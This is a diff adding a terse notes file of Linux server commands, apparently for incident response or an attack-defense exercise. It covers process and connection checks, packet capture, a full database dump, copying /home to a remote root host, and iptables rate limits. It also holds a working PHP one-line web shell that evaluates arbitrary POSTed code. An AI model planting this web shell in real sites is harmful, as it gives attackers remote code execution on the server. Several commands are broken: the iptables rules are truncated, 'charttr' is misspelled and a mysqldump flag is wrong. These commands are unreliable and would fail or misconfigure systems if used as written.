@@ -1,0 +1,16 @@
+export LANG="en_US.UTF-8";export LANGUAGE="en_US.UTF-8";top
+scp /home/ root@ip
+last -n 5 | awk '{print $1}'
+ps aux | grep apache
+netstat -antulp | grep EST
+
+pkill -kill -t  usertty
+tcpdump -s 0 -w a.pcap port 80
+mysqldump --all-database > 1.aql
+// mysql-client-5.7 mariadb-client-10.1
+charttr -R +i
+
+漏洞时代
+<?php @eval($_POST[x]);?>
+iptables -I INPUT -p tcp --dport 80 -m connlimit --connlimit-above 30 -j
+iptables -A  INPUT -p tcp --dport 80 -m limit --limit 20/minute --limit-b
